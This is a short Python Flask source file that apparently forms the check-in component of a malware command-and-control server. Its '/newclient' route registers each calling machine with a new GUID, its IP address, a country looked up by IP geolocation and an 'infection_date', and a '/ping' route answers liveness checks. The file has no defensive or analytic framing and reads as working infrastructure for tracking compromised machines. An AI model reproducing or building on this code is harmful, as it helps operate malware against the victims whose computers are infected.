from flask import render_template, url_for, jsonify, redirect, request
from app.checkin import bp
from app.models import Host
from app import db
from datetime import datetime
import uuid
import json
import requests


@bp.route('/ping', methods=['GET', 'POST'])
def receive_ping():
    """
       Checking of new client
    """
    #form = EmptyForm(request.form)
    if request.method == 'GET':
        return "is alive"


def get_country(ip):
    if not ip == "127.0.0.1":
        try:
            client_country = json.loads(requests.get('https://ipinfo.io/{}/json'.format(ip)).text)["country"]
            return client_country
        except KeyError:
            return None


@bp.route('/newclient/<computername>', methods=['GET'])
def checkin(computername=None):
    """
       Checking of new client
    """
    #form = EmptyForm(request.form)
    if request.method == 'GET':
        client_ip = request.remote_addr
        client_country = get_country(client_ip)
        if client_country == None:
            client_country = "local network"
        newid = str(uuid.uuid4().hex)
        obj = Host(guid=newid, ip=client_ip, status="Offline", infection_date=datetime.now(), computername=computername, country=client_country)
        db.session.add(obj)
        db.session.commit()
        return newid
    else:
        """
            error 36 means wrong guid 
        """
        return "Error 36"
